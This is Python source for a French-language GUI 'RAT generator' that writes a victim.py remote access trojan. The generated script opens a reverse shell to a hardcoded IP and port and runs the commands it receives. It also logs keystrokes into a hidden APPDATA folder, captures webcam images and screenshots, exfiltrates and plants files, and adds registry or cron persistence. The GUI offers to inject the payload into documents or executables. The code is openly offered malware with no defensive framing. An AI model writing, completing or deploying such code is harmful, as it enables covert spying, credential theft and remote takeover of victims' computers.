import customtkinter as ctk
from tkinter import filedialog, messagebox
import os

def create_victim_script():
    victim_script_content = """#!/usr/bin/python3

import socket
import subprocess
import time
import os
import sys
import shutil
import platform
import json
import threading
import cv2
import io
import keyboard
import pyautogui
import winreg as reg

time_interval = 10
text = ""

# Configuration de l'environnement selon l'OS
hidden_folder = os.path.join(os.getenv('APPDATA'), "SecretFolder", "keystrokes")

os.makedirs(hidden_folder, exist_ok=True)  # Creer le repertoire cache s'il n'existe pas

# Fichier de touches
keystroke_file_path = os.path.join(hidden_folder, "keystrokes.txt")

# Variable pour suivre l'etat de l'enregistrement
is_recording = False

#la fonction qui vas envoyer la resultat des commande executer 
def sending(command):
    try:
        json_data = json.dumps(command)
        s.send(json_data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")

#la fonction qui vas recever les commande a executer 
def receive():
    json_data = ""
    while True:
        try:
            chunk = s.recv(4096).decode()
            if not chunk:
                break
            json_data += chunk
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue
        except Exception:
            print(f"Error receiving data: {s}")
            break

#la fonction qui vas etablire la connectiviter
def connection():
    global s
    while True:
        time.sleep(20)
        try:
            s.connect(("192.168.1.109", 4444))
            shell()
            break  # Exit loop after successful shell session
        except socket.error as e:
            print(f"Connection error: {e}")
            continue  # Retry after sleep interval

def record_keystrokes():
    global is_recording
    try:
        with open(keystroke_file_path, 'a') as data_file:
            data_file.write(f"Started recording at {time.ctime()}")
            while is_recording:
                # Enregistrer les touches en continu
                events = keyboard.record('enter')  # Enregistrer jusqu'a "enter"
                password = list(keyboard.get_typed_strings(events))
                if password:
                    data_file.write(password[0])  # Sauvegarder les touches dans le fichier
                    data_file.write('')  # Ajouter une nouvelle ligne apres chaque entree
                time.sleep(0.1)  # Petite pause pour ne pas surcharger la CPU
    except Exception as e:
        print(f"Error while recording keystrokes: {str(e)}")

# Fonction pour demarrer l'enregistrement
def start_keylogger():
    global is_recording
    # Reinitialiser le fichier de frappes au debut
    try:
        with open(keystroke_file_path, 'w') as data_file:
            data_file.write("")  # Vider le contenu
    except Exception as e:
        print(f"Error resetting keystroke file: {str(e)}")
    
    is_recording = True
    threading.Thread(target=record_keystrokes, daemon=True).start()

# Fonction pour arrêter l'enregistrement
def stop_keylogger():
    global is_recording
    is_recording = False  

# fonction pour le  keylooger
def handle_keylogger_command(command):
    if command.strip() == "keylogger start":
        # Demarrer l'enregistrement des touches
        start_keylogger()
        sending("Keystroke recording started.")
    elif command.strip() == "keylogger stop":
        # Arrêter l'enregistrement et envoyer le fichier
        stop_keylogger()
        time.sleep(1)
        send_keystrokes_file()
    else:
        sending(f"Unknown keylogger command: {command}")

def send_keystrokes_file():
    try:
        with open(keystroke_file_path, 'rb') as file:
            file_data = file.read().hex()  # Convertir le fichier en hexadecimal pour l'envoyer   
        sending({"status": "success", "data": file_data})
    except Exception as e:
        sending({"status": "error", "message": str(e)})    

def add_persistence():
    python_path = sys.executable  # Recuperer le chemin vers l'executable Python
    script_path = os.path.abspath("your_script.py")  # Remplacer par le chemin de votre script

    try:
        if platform.system() == "Windows":
            # Ouvrir la cle du registre HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
            registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
            
            # Ajouter l'entree pour le script Python
            reg.SetValueEx(registry_key, "MyEmptyKey", 0, reg.REG_SZ, "")

            # Fermer la cle du registre
            reg.CloseKey(registry_key)
        else:
            # Ajouter une tâche cron pour Linux
            cron_job = f"@reboot {python_path} {script_path}"
            with open(os.path.expanduser("~/.crontab"), "a") as cron_file:
                cron_file.write(cron_job)

        return "Persistance configuree avec succes ! Le script s'executera au demarrage."

    except Exception as e:
        return f"Erreur lors de la configuration de la persistance : {str(e)}"

# fonction pour prendre une photo de la cible 
def camera_handler():
    try:
        # Ouvrir la camera
        capture = cv2.VideoCapture(0)
        if not capture.isOpened():
            sending("Error: Could not access the camera.")
            return

        # Capturer une seule image
        ret, frame = capture.read()
        if not ret or frame is None:
            sending("Error: Could not capture an image from the camera.")
            capture.release()
            return

        # Encoder l'image en format PNG et convertir en hexadecimal
        success, buffer = cv2.imencode(".png", frame)
        if not success:
            sending("Error: Could not encode the image.")
            capture.release()
            return

        image_data = buffer.tobytes().hex()

        # Envoyer l'image encodee au serveur
        sending({"status": "success", "data": image_data})
    except Exception as e:
        sending(f"Error: {str(e)}")
    finally:
        capture.release()
        cv2.destroyAllWindows()

# fonction pour faire des screenshot de la machine cible 

def screenshot_handler():
    try:
        print("Attempting to capture screenshot...")  # Debug message
        # Capturer une capture d'ecran
        screenshot = pyautogui.screenshot()
        
        # Sauvegarder l'image dans un buffer au format PNG
        buffer = io.BytesIO()
        screenshot.save(buffer, format="PNG")
        buffer.seek(0)

        # Envoyer les donnees de l'image encodee en hexadecimal
        sending({"status": "success", "data": buffer.getvalue().hex()})
        print("Screenshot captured and sent successfully.")  # Debug message
    except Exception as e:
        print(f"Screenshot capture error: {str(e)}")  # Debug message
        sending({"status": "error", "message": str(e)})

#fonction pour transmetre des fichiers 
def upload_handler(command):
    try:
        # Extraire le nom du fichier et les donnees
        parts = command.split(" ", 2)
        
        if len(parts) < 3:
            sending("Error: Invalid upload command format.")
            return

        filepath = parts[1]
        filedata = parts[2]

        # Recuperer le chemin du bureau de l'utilisateur
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

        # Nom de fichier seulement (sans le chemin d'origine)
        filename = os.path.basename(filepath)

        # Chemin complet du fichier sur le bureau
        target_path = os.path.join(desktop_path, filename)

        # ecrire les donnees dans le fichier
        with open(target_path, "wb") as f:
            f.write(bytes.fromhex(filedata))

        sending(f"File {filename} uploaded successfully to Desktop.")
    except Exception as e:
        sending(f"Error uploading file: {str(e)}")

# fonction pour recuperer des fichiers 
def download_file(command):
    try:
        filepath = command[9:].strip()
        with open(filepath, "rb") as f:
            sending({"status": "success", "data": f.read().hex()})
    except FileNotFoundError:
        sending({"status": "error", "message": "File not found"})
    except Exception as e:
        sending({"status": "error", "message": str(e)})

# fonction des commandes de base 
def handle_command(command):
    if command is None:
        print("Connection closed by the server.")
        return False
    
    # Traitement de la commande quitter le shell
    if command.lower() in ["exit", "quit"]:
        print("Command received to end connection.")
        return False
    
    return True

# fonction les commandes de shell 
def execute_command(command):
    try:
        proc = subprocess.Popen(
            command, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
        )
        result = proc.stdout.read() + proc.stderr.read()
        sending(result.decode('utf-8', errors='replace'))
    except Exception as e:
        sending(f"Error executing command: {str(e)}")

def shell():
    while True:
        try:
            command = receive()
            if not handle_command(command):
                break
    """

    with open("victim.py", "w") as file:
        file.write(victim_script_content)


#add code 

def add_code_to_victim_script():
    code_to_add = """
            # Executer toutes les autres commandes
            execute_command(command)

        except socket.error as e:
            print(f"Socket error: {e}")
            break
        except Exception as e:
            print(f"General error: {e}")
            sending(f"Error: {str(e)}")

    print("Exiting shell...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connection()
finally:
    s.close()"""
    
    with open("victim.py", "a") as file:  # Ouvrir en mode ajout
        file.write(code_to_add)

#handel
def handle_button_click(self):
        # Appeler la methode save_and_next
        self.save_and_next()
        # Appeler la methode add_code_to_victim_script
        self.add_code_to_victim_script()


# ajouter le code keylogger dans le code victim 

def add_keylogger_code_to_victim_script(self):
        keylogger_code = """
           elif command.startswith("keylogger"):
                handle_keylogger_command(command)
                continue
"""
        # Ajouter le code dans le fichier victim.py
        with open("victim.py", "a") as file:
            file.write(keylogger_code)
        print("Code du keylogger ajoute dans victim.py")
    

# Configuration globale pour un design moderne
ctk.set_appearance_mode("dark")  # Thème sombre
ctk.set_default_color_theme("blue")  # Palette de couleurs modernes

class Application(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Genérateur de RAT - Interface Professionnelle")
        self.geometry("600x600")  # Taille augmentée pour plus d'espace visuel
        self.resizable(False, False)  # Empêche le redimensionnement pour préserver le design
        self.user_choices = {
            "options": [],
            "file_to_inject": None,
            "extension": ".exe",
            "output_path": None,
            "ip_address": "127.0.0.1",
            "port": 8080,
            "encryption_method": "AES"
        }

        # Configuration principale pour que tout le contenu s'étende
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)

        # Conteneur principal
        self.container = ctk.CTkFrame(self, corner_radius=10)
        self.container.grid(row=0, column=0)

        # Initialisation des pages
        self.pages = {}
        for Page in (IntroductionPage, OptionsPage, FileSelectionPage, NetworkSettingsPage, OutputPage):
            page_name = Page.__name__
            page = Page(parent=self.container, controller=self)
            self.pages[page_name] = page
            page.grid(row=0, column=0, sticky="nsew")

        self.show_page("IntroductionPage")

    def show_page(self, page_name):
        """Afficher une page spécifique."""
        page = self.pages[page_name]
        page.tkraise()

class CenteredFrame(ctk.CTkFrame):
    """Cadre professionnel avec un design soigné."""
    def __init__(self, parent, **kwargs):
        super().__init__(parent, **kwargs)
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        self.inner_frame = ctk.CTkFrame(self, corner_radius=15)
        self.inner_frame.grid(row=0, column=0, padx=20, pady=20, sticky="nsew")

class IntroductionPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Bienvenue dans le Générateur de RAT",
                     font=("Arial", 28, "bold"), text_color="lightblue").pack(pady=20)

        ctk.CTkLabel(self.inner_frame, text="Créez un RAT personnalisé avec des fonctionnalités avancées\n"
                                            "et injectez-le dans un fichier cible.",
                     font=("Arial", 18), justify="center").pack(pady=20)

        # Code pour afficher la page OptionsPage
        ctk.CTkButton(self.inner_frame, text="Commencer",
                font=("Arial", 18), corner_radius=10,
                command=lambda: [create_victim_script(), controller.show_page("OptionsPage")]).pack(pady=30)

class OptionsPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Options du RAT",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        # Description et liste d'options avec des cases à cocher
        self.options = {
            "Keylogger": "Enregistre toutes les frappes du clavier.",
            "Ouvrir la webcam": "Active la webcam pour espionner.",
            "Capture d'écran": "Prend des captures d'écran à intervalles réguliers.",
            "Récupération des fichiers": "Télécharge les fichiers spécifiques depuis la cible.",
            "Transmettre des fichiers": "Permet d'envoyer des fichiers vers la cible.",
            "Persistance": "Implémente la persistance pour maintenir l'accès.",
            "Surveillance du microphone": "Écoute via le microphone.",
            
        }

        self.selected_options = {}
        for option, description in self.options.items():
            var = ctk.BooleanVar()
            checkbox = ctk.CTkCheckBox(self.inner_frame, text=option, variable=var,
                                       font=("Arial", 14), text_color="white",
                                       command=lambda o=option, d=description: self.show_description(o, d))
            checkbox.pack(anchor="w", pady=5)
            self.selected_options[option] = var

        self.description_label = ctk.CTkLabel(self.inner_frame, text="Sélectionnez une option pour voir sa description.",
                                              font=("Arial", 14), text_color="gray")
        self.description_label.pack(pady=15)

        # Boutons de navigation
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(fill="x", pady=20)

        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                      command=lambda: controller.show_page("IntroducionPage")).pack(side="left", padx=10)

        # Créer un bouton qui appelle la méthode handle_button_click
        ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
                      command=self.save_and_next()).pack(side="right", padx=20)
        # Créer un bouton qui appelle la méthode handle_button_click
        ctk.CTkButton(button_frame, text="save", font=("Arial", 16),
                      command=lambda: [add_code_to_victim_script()]).pack(side="right" , padx=12)
        

    def show_description(self, option, description):
        """Affiche la description de l'option sélectionnée."""
        self.description_label.configure(text=f"{option} : {description}")
         # Si l'option "Keylogger" est cochée, ajouter le code dans victim.py
        if option == "Keylogger" and self.selected_options["Keylogger"].get():
            self.add_keylogger_code_to_victim_script()
        elif option == "Ouvrir la webcam" and self.selected_options["Ouvrir la webcam"].get():
            self.add_camera_code_to_victim_script()
        elif option == "Capture d'écran" and self.selected_options["Capture d'écran"].get():
            self.add_screenshot_code_to_victim_script()
        elif option == "Récupération des fichiers" and self.selected_options["Récupération des fichiers"].get():
            self.add_download_code_to_victim_script()
        elif option == "Transmettre des fichiers" and self.selected_options["Transmettre des fichiers"].get():
            self.add_upload_code_to_victim_script()
        elif option == "Persistance" and self.selected_options["Persistance"].get():
            self.add_persistence_code_to_victim_script()

        
    def save_and_next(self):
        selected = [option for option, var in self.selected_options.items() if var.get()]
        if not selected:
            messagebox.showwarning("Avertissement", "Veuillez sélectionner au moins une option.")
            return
        self.controller.user_choices["options"] = selected
        self.controller.show_page("FileSelectionPage")
    
    def add_keylogger_code_to_victim_script(self):
        keylogger_code = """
            elif command.startswith("keylogger"):
                handle_keylogger_command(command)
                continue
            """
        self.append_code_to_victim_script(keylogger_code)
    
    def add_camera_code_to_victim_script(self):
        """
        Ajouter le code pour activer la webcam dans victim.py.
        """
        camera_code = """
            elif command.strip() == "camera":
                camera_handler()
                continue
            """
        self.append_code_to_victim_script(camera_code)
    
    def add_screenshot_code_to_victim_script(self):
        screenshot_code = """
            elif command.strip() == "screenshot":
                screenshot_handler()
                continue
            """
        self.append_code_to_victim_script(screenshot_code)


    def add_download_code_to_victim_script(self):
        download_code = """
            elif command.startswith("download "):
                download_file(command)
                continue
            """
        self.append_code_to_victim_script(download_code)


    def add_persistence_code_to_victim_script(self):
        persistence_code = """
            elif command.strip() == "persistence":
                response = add_persistence()
                sending(response)
                continue
            """
        self.append_code_to_victim_script(persistence_code)

    def add_upload_code_to_victim_script(self):
        upload_code = """
            elif command.startswith("upload "):
                upload_handler(command)
                continue
            """
        self.append_code_to_victim_script(upload_code)


    def append_code_to_victim_script(self, code):
        """
        Ajouter un bloc de code dans le fichier victim.py.
        """
        with open("victim.py", "a") as file:
            file.write(code)
        


class FileSelectionPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Sélectionner un fichier pour l'injection",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        self.file_label = ctk.CTkLabel(self.inner_frame, text="Aucun fichier sélectionné",
                                       font=("Arial", 16), text_color="gray")
        self.file_label.pack(pady=10)

        # Menu déroulant et bouton pour sélectionner un fichier
        ctk.CTkLabel(self.inner_frame, text="Choisir l'extension :", font=("Arial", 14)).pack(pady=10)
        self.extension_menu = ctk.CTkOptionMenu(self.inner_frame, values=[".exe", ".pdf", ".txt", ".docx"],
                                                command=self.select_extension)
        self.extension_menu.pack(pady=10)

        ctk.CTkButton(self.inner_frame, text="Choisir un fichier", font=("Arial", 16),
                      command=self.choose_file).pack(pady=10)

        # Boutons de navigation
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(fill="x", pady=20)

        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                      command=lambda: controller.show_page("OptionsPage")).pack(side="left", padx=10)
    
        ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
                      command=lambda: controller.show_page("NetworkSettingsPage")).pack(side="right", padx=10)

    def select_extension(self, extension):
        """Met à jour l'extension choisie."""
        self.controller.user_choices["extension"] = extension

    def choose_file(self):
        file_path = filedialog.askopenfilename(title="Choisir un fichier")
        if file_path:
            self.controller.user_choices["file_to_inject"] = file_path
            self.file_label.configure(text=f"Fichier sélectionné : {file_path}", text_color="white")

class NetworkSettingsPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Paramètres Réseau",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        # Adresse IP
        ctk.CTkLabel(self.inner_frame, text="Adresse IP :", font=("Arial", 14)).pack(pady=5)
        self.ip_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="127.0.0.1")
        self.ip_entry.insert(0, self.controller.user_choices["ip_address"])
        self.ip_entry.pack(pady=5)

        # Port
        ctk.CTkLabel(self.inner_frame, text="Port :", font=("Arial", 14)).pack(pady=5)
        self.port_entry = ctk.CTkEntry(self.inner_frame, placeholder_text="8080")
        self.port_entry.insert(0, str(self.controller.user_choices["port"]))
        self.port_entry.pack(pady=5)

        # Méthode de chiffrement
        ctk.CTkLabel(self.inner_frame, text="Méthode de chiffrement :", font=("Arial", 14)).pack(pady=5)
        self.encryption_menu = ctk.CTkOptionMenu(self.inner_frame, values=["AES", "RSA"],
                                                 command=self.select_encryption)
        self.encryption_menu.set(self.controller.user_choices["encryption_method"])
        self.encryption_menu.pack(pady=5)

        # Boutons de navigation
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(fill="x", pady=20)

        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                      command=lambda: controller.show_page("FileSelectionPage")).pack(side="left", padx=10)

        ctk.CTkButton(button_frame, text="Suivant", font=("Arial", 16),
                      command=self.save_and_next).pack(side="right", padx=10)

    def select_encryption(self, method):
        self.controller.user_choices["encryption_method"] = method

    def save_and_next(self):
        self.controller.user_choices["ip_address"] = self.ip_entry.get()
        self.controller.user_choices["port"] = int(self.port_entry.get())
        self.controller.show_page("OutputPage")

class OutputPage(CenteredFrame):
    def __init__(self, parent, controller):
        super().__init__(parent)
        self.controller = controller

        ctk.CTkLabel(self.inner_frame, text="Emplacement de stockage",
                     font=("Arial", 24, "bold"), text_color="lightblue").pack(pady=20)

        self.output_label = ctk.CTkLabel(self.inner_frame, text="Aucun emplacement sélectionné",
                                         font=("Arial", 16), text_color="gray")
        self.output_label.pack(pady=10)

        ctk.CTkButton(self.inner_frame, text="Choisir un emplacement", font=("Arial", 16),
                      command=self.choose_output).pack(pady=10)

        # Boutons de navigation
        button_frame = ctk.CTkFrame(self.inner_frame)
        button_frame.pack(fill="x", pady=20)

        ctk.CTkButton(button_frame, text="Précédent", font=("Arial", 16),
                      command=lambda: controller.show_page("NetworkSettingsPage")).pack(side="left", padx=10)

        ctk.CTkButton(button_frame, text="Générer", font=("Arial", 16),
                      command=self.generate_rat).pack(side="right", padx=10)

    def choose_output(self):
        output_path = filedialog.askdirectory(title="Choisir un emplacement de stockage")
        if output_path:
            self.controller.user_choices["output_path"] = output_path
            self.output_label.configure(text=f"Emplacement sélectionné : {output_path}", text_color="white")

    def generate_rat(self):
        if not self.controller.user_choices["output_path"]:
            messagebox.showwarning("Avertissement", "Veuillez sélectionner un emplacement de stockage.")
            return

        options = ", ".join(self.controller.user_choices["options"])
        file_to_inject = self.controller.user_choices["file_to_inject"]
        extension = self.controller.user_choices["extension"]
        output_path = self.controller.user_choices["output_path"]
        ip_address = self.controller.user_choices["ip_address"]
        port = self.controller.user_choices["port"]
        encryption_method = self.controller.user_choices["encryption_method"]

        messagebox.showinfo(
            "Succès",
            f"RAT généré avec succès !\n\nOptions : {options}\nExtension : {extension}\n"
            f"Fichier injecté : {file_to_inject}\nIP : {ip_address}\nPort : {port}\n"
            f"Méthode de chiffrement : {encryption_method}\nStocké dans : {output_path}"
        )

if __name__ == "__main__":
    app = Application()
    app.mainloop()
